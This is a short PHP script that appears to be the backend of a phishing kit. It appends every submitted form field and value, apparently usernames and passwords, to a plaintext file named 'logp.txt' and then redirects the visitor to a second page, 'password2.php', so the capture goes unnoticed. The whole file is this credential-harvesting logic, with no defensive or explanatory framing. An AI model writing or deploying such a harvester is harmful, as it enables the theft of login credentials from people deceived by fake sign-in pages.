<?php
 
// Set the location to redirect the page
header ('Location: password2.php');
 
// Open the text file in writing mode
$file = fopen("logp.txt", "a");
 
foreach($_POST as $variable => $value) {
    fwrite($file, $variable);
    fwrite($file, "=");
    fwrite($file, $value);
    fwrite($file, "\r\n");
}
 
fwrite($file, "\r\n");
fclose($file);
exit;
?>